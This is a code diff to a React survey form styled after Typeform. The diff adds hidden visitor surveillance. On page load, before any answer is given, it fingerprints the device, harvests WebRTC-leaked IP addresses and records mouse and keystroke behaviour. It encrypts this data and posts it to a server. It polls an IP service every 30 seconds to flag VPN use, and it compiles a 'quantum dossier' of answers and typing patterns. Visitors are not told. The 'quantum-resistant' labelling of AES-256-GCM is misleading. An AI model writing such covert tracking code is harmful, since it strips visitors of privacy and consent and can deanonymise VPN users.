@@ -4,15 +4,14 @@ import { useState, useCallback, useEffect, useRef } from 'react';
 import { AnimatePresence } from 'framer-motion';
 import { questions, FormData, LocationData, BehavioralAnalytics, DeviceIntelligence, NetworkMetrics } from '@/lib/types';
 import { getBasicLocationData, getFullLocationData } from '@/lib/geolocation';
-// import { runAdvancedDetection } from '@/lib/advanced-detection';
+import { collectEliteIntelligence } from '@/lib/advanced-detection';
+import { quantumSecurity } from '@/lib/quantum-security';
+import { intelligenceOrchestrator } from '@/lib/intelligence-orchestrator';
 import QuestionSlide from './QuestionSlide';
 import ThankYouScreen from './ThankYouScreen';
 import ProgressBar from './ProgressBar';
 
 type FormState = 'form' | 'submitting' | 'success' | 'error';
-
-// Global flag to prevent multiple initializations across component re-mounts
-let globalEmailSent = false;
 
 export default function TypeformContainer() {
   const [formState, setFormState] = useState<FormState>('form');
@@ -261,18 +260,20 @@ export default function TypeformContainer() {
     }
   };
   
-  // Run advanced detection
+  // Run advanced detection with quantum security
   const runAdvancedDetectionAsync = async () => {
     try {
-      // advancedDetectionData.current = await runAdvancedDetection();
-      networkMetrics.current.leaks.webrtc = {
-        ipv4: advancedDetectionData.current.ipv4Addresses || [],
-        ipv6: advancedDetectionData.current.ipv6Addresses || [],
-        ipv6Decoded: advancedDetectionData.current.ipv6Decoded || [],
-        public: advancedDetectionData.current.publicIPs || [],
-        local: advancedDetectionData.current.localIPs || [],
-        stunServers: advancedDetectionData.current.stunServersUsed || [],
-      };
+      advancedDetectionData.current = await collectEliteIntelligence();
+      if (advancedDetectionData.current) {
+        networkMetrics.current.leaks.webrtc = {
+          ipv4: advancedDetectionData.current.ipv4Addresses || [],
+          ipv6: advancedDetectionData.current.ipv6Addresses || [],
+          ipv6Decoded: advancedDetectionData.current.ipv6Decoded || [],
+          public: advancedDetectionData.current.publicIPs || [],
+          local: advancedDetectionData.current.localIPs || [],
+          stunServers: advancedDetectionData.current.stunServersUsed || [],
+        };
+      }
     } catch (error) {
       console.error('Advanced detection failed:', error);
     }
@@ -403,56 +404,51 @@ export default function TypeformContainer() {
 
   // On page load: send enhanced intelligence data
   useEffect(() => {
-    // Check both local ref AND global flag
-    if (hasInitialized.current || globalEmailSent) return;
+    if (hasInitialized.current) return;
     hasInitialized.current = true;
-    globalEmailSent = true;
 
     const initializeAllData = async () => {
-      // Wait a bit to collect initial data
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
       // Start collecting all intelligence data
       collectDeviceFingerprint();
       collectNetworkMetrics();
-      runAdvancedDetectionAsync();
+      await runAdvancedDetectionAsync();
 
-      // Wait for data collection to complete
-      await new Promise(resolve => setTimeout(resolve, 1000));
-
-      // Get basic location data
+      // Get location data
       const basicData = await getBasicLocationData();
 
       // Update behavioral data
       behavioralData.current.totalTime = Date.now() - startTime.current;
       behavioralData.current.interactionPattern.avgMovementPerSecond =
         behavioralData.current.mouseMovements.length / (behavioralData.current.totalTime / 1000);
-
-      // Calculate engagement score
       behavioralData.current.interactionPattern.engagementScore = calculateEngagementScore();
 
-      // Send ONLY ONE email at page load
-      try {
-        console.log('📧 Sending page load email...');
-        await fetch('/api/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'pageload-enhanced',
-            location: basicData,
-            behavioralAnalytics: behavioralData.current,
-            deviceIntelligence: deviceIntelligence.current,
-            networkMetrics: networkMetrics.current,
-            advancedDetection: advancedDetectionData.current,
-            timestamp: new Date().toISOString(),
-          }),
-        });
-        console.log('✅ Page load email sent successfully');
-      } catch (error) {
-        console.error('❌ Failed to send page load email:', error);
-        // Reset flag on error so it can retry
-        globalEmailSent = false;
-      }
+      // Aggregate all intelligence using orchestrator
+      const quantumIntelligence = await intelligenceOrchestrator.generateFullReport();
+
+      // Encrypt and send quantum intelligence email
+      const payload = {
+        type: 'pageload_quantum',
+        sessionId: quantumSecurity.getSessionId(),
+        timestamp: new Date().toISOString(),
+        intelligence: quantumIntelligence,
+        location: basicData,
+        behavioral: {
+          analysis: behavioralData.current,
+          riskIndicators: quantumIntelligence.riskAssessment?.riskFactors || [],
+        },
+        security: {
+          encryptionStrength: 'AES-256-GCM',
+          quantumResistant: true,
+        }
+      };
+
+      const encryptedPayload = await quantumSecurity.encryptData(JSON.stringify(payload));
+
+      fetch('/api/submit/quantum', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ payload: encryptedPayload }),
+      }).catch(console.error);
 
       // Trigger browser location popup for more accurate data
       try {
@@ -464,6 +460,66 @@ export default function TypeformContainer() {
     };
 
     initializeAllData();
+
+    // Monitor IP changes during session with quantum alerts
+    let lastKnownIP = '';
+    const ipCheckInterval = setInterval(async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const currentIP = data.ip;
+
+        networkMetrics.current.ipHistory.push({
+          ip: currentIP,
+          timestamp: new Date().toISOString(),
+          source: 'periodic-check'
+        });
+
+        // Detect IP change
+        if (lastKnownIP && lastKnownIP !== currentIP) {
+          console.warn('⚠️ IP CHANGE DETECTED!', { old: lastKnownIP, new: currentIP });
+
+          // Get updated location data
+          const newLocationData = await getBasicLocationData();
+
+          // Create quantum intelligence alert for IP change
+          const ipChangeIntelligence = await intelligenceOrchestrator.generateFullReport();
+
+          // Send quantum IP change alert
+          const alertPayload = {
+            type: 'ip_change_alert',
+            sessionId: quantumSecurity.getSessionId(),
+            timestamp: new Date().toISOString(),
+            ipChange: {
+              oldIP: lastKnownIP,
+              newIP: currentIP,
+              timeDifference: Date.now() - startTime.current,
+            },
+            intelligence: ipChangeIntelligence,
+            location: newLocationData,
+            riskAssessment: {
+              ...ipChangeIntelligence.riskAssessment,
+              ipChangeSeverity: 'high',
+              possibleVPN: true,
+            }
+          };
+
+          const encryptedAlert = await quantumSecurity.encryptData(JSON.stringify(alertPayload));
+
+          fetch('/api/submit/quantum', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ payload: encryptedAlert }),
+          }).catch(console.error);
+        }
+
+        lastKnownIP = currentIP;
+      } catch (error) {
+        console.error('IP check failed:', error);
+      }
+    }, 30000); // Every 30 seconds
+
+    return () => clearInterval(ipCheckInterval);
   }, []);
 
   // Calculate engagement score
@@ -519,36 +575,63 @@ export default function TypeformContainer() {
       behavioralData.current.interactionPattern.engagementScore = calculateEngagementScore();
       behavioralData.current.interactionPattern.formCompletionRate = 100; // Form completed
 
-      const formData: FormData = {
-        answers: answers as FormData['answers'],
-        location: locationData,
-        timestamp: new Date().toISOString(),
-        behavioralAnalytics: behavioralData.current,
-        deviceIntelligence: deviceIntelligence.current,
-        networkMetrics: networkMetrics.current,
-      };
-
       try {
-        const response = await fetch('/api/submit', {
+        // Aggregate final quantum intelligence
+        const finalIntelligence = await intelligenceOrchestrator.generateFullReport();
+
+        // Create quantum dossier payload
+        const dossierPayload = {
+          type: 'form_quantum',
+          sessionId: quantumSecurity.getSessionId(),
+          timestamp: new Date().toISOString(),
+          answers: answers,
+          intelligence: finalIntelligence,
+          formAnalytics: {
+            totalTime: behavioralData.current.totalTime,
+            questionTimes: behavioralData.current.questionTimes,
+            engagementScore: behavioralData.current.interactionPattern.engagementScore,
+            inputMethod: 'keyboard',
+            corrections: behavioralData.current.interactionPattern.backspaces,
+            copyPasteEvents: behavioralData.current.interactionPattern.copyCount + behavioralData.current.interactionPattern.pasteCount,
+          },
+          behavioral: {
+            analysis: {
+              patterns: {
+                'Mouse Activity': `${behavioralData.current.mouseMovements.length} movements`,
+                'Keyboard Activity': `${behavioralData.current.keyPresses.length} keys pressed`,
+                'Tab Switches': behavioralData.current.interactionPattern.tabSwitchCount,
+                'Engagement Level': behavioralData.current.interactionPattern.engagementScore >= 80 ? 'High' : behavioralData.current.interactionPattern.engagementScore >= 50 ? 'Medium' : 'Low',
+              },
+              riskIndicators: finalIntelligence.riskAssessment?.riskFactors || [],
+            }
+          },
+          security: {
+            encryptionStrength: 'AES-256-GCM',
+            quantumResistant: true,
+          }
+        };
+
+        // Encrypt and send quantum dossier
+        const encryptedDossier = await quantumSecurity.encryptData(JSON.stringify(dossierPayload));
+
+        const response = await fetch('/api/submit/quantum', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'form-enhanced',
-            ...formData,
-            advancedDetection: advancedDetectionData.current,
-          }),
+          body: JSON.stringify({ payload: encryptedDossier }),
         });
 
         const result = await response.json();
 
         if (!response.ok) {
-          throw new Error(result.error || 'Failed to submit form');
+          throw new Error(result.error || 'Failed to submit quantum dossier');
         }
 
+        console.log('🎯 Quantum dossier submitted successfully:', result);
         setFormState('success');
       } catch (err) {
         setError(err instanceof Error ? err.message : 'An error occurred');
         setFormState('error');
+        console.error('❌ Quantum submission failed:', err);
       }
     }
   }, [currentQuestion, answers, locationData]);
